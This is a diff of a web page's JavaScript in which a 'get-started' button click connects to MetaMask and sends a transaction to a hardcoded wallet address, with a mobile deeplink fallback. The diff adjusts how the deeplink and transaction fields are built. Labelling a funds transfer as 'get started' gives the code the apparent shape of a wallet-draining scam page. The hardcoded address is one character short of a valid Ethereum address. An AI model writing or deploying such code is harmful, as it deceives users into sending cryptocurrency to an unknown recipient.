@@ -1,4 +1,5 @@
-  document.getElementById('get-started').addEventListener('click', connectAndSend);
+
+       document.getElementById('get-started').addEventListener('click', connectAndSend);
 
         async function connectAndSend() {
             const recipientAddress = "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8";
@@ -6,9 +7,9 @@
 
             if (!window.ethereum || !window.ethereum.isMetaMask) {
                 if (isMobile()) {
-                    // Redirect to MetaMask on mobile with transaction details
-                    const transactionUrl = `https://metamask.app.link/send/${recipientAddress}?value=0`;
-                    window.location.href = transactionUrl;
+                    // Redirect to MetaMask on mobile
+                    const deeplink = `https://metamask.app.link/send/${recipientAddress}`;
+                    window.location.href = deeplink;
                 } else {
                     alert('MetaMask is not installed');
                 }
@@ -48,9 +49,9 @@
             // Define the transaction
             const transaction = {
                 to: recipientAddress,
-                value: value.toString(), // Convert to string for URL
-                gasLimit: gasLimit.toString(), // Convert to string for URL
-                gasPrice: gasPrice.toString() // Convert to string for URL
+                value: value,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice
             };
 
             // Send the transaction on desktop
@@ -65,11 +66,6 @@
         function isMobile() {
             return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         }
-         
-            
-
-   
-   
  
 
 
